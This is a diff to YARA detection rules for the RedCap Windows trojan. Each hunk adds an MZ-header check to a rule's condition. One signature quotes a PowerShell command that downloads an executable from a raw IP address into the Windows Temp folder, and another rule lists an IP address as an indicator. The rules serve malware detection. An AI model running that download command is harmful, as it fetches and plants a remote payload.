@@ -17,6 +17,7 @@ rule Trojan_Win32_RedCap_CB_2147838918_0
         $x_3_2 = "Control Panel\\Desktop\\ResourceLocale" ascii //weight: 3
     condition:
         (filesize < 20MB) and
+        (uint16(0) == 0x5a4d) and
         (all of ($x*))
 }
 
@@ -38,6 +39,7 @@ rule Trojan_Win32_RedCap_SP_2147843099_0
         $x_3_1 = "powershell -Command \"Invoke-WebRequest -Uri 'http://146.190.48.229/fuackme100.exe' -OutFile 'C:\\Windows\\Temp\\file1.exe'\"" ascii //weight: 3
     condition:
         (filesize < 20MB) and
+        (uint16(0) == 0x5a4d) and
         (all of ($x*))
 }
 
@@ -60,6 +62,7 @@ rule Trojan_Win32_RedCap_SPH_2147846323_0
         $x_1_2 = "103.59.113.33" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint16(0) == 0x5a4d) and
         (all of ($x*))
 }
 
@@ -83,6 +86,7 @@ rule Trojan_Win32_RedCap_SPD_2147847626_0
         $x_1_3 = "WaitForSingleObject" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint16(0) == 0x5a4d) and
         (all of ($x*))
 }
 
